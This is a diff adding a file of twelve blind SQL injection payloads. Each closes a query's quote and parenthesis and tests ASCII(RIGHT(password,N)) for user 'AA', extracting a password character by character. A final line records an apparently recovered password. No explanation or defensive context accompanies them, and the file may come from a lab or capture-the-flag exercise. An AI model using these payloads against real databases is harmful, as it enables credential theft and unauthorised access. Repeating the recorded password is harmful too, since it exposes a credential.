@@ -1,0 +1,25 @@
+') or username='AA' and ASCII(RIGHT(password,12)) =107  or ('0'='1
+
+') or username='AA' and ASCII(RIGHT(password,11)) =107  or ('0'='1
+
+') or username='AA' and ASCII(RIGHT(password,10)) =107  or ('0'='1
+
+') or username='AA' and ASCII(RIGHT(password,9)) =107  or ('0'='1
+
+') or username='AA' and ASCII(RIGHT(password,8)) =107  or ('0'='1
+
+') or username='AA' and ASCII(RIGHT(password,7)) =107  or ('0'='1
+
+') or username='AA' and ASCII(RIGHT(password,6)) =107  or ('0'='1
+
+') or username='AA' and ASCII(RIGHT(password,5)) =107  or ('0'='1
+
+') or username='AA' and ASCII(RIGHT(password,4)) =107  or ('0'='1
+
+') or username='AA' and ASCII(RIGHT(password,3)) =107  or ('0'='1
+
+') or username='AA' and ASCII(RIGHT(password,2)) =107  or ('0'='1
+
+') or username='AA' and ASCII(RIGHT(password,1)) =107  or ('0'='1
+
+ password=k4DJECC$hbRM
